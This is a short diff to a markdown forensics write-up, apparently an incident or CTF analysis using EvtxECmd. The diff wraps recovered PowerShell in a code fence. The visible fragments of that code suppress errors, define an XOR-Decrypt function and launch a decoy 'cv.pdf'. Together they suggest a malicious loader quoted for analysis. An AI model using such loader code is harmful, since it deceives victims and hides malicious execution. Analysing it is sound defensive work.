@@ -46,6 +46,7 @@ mkdir "D:\EvtxECmd\EvtxeCmd\Logs\CSV"
 
 - And got the Powershell code:
 
+```powershell
 $ErrorActionPreference = 'SilentlyContinue'
 
 function XOR-Decrypt {
@@ -99,3 +100,4 @@ if (Test-Path $shiPath) {
         Start-Process "$PWD\cv.pdf"
     }
 }
+```
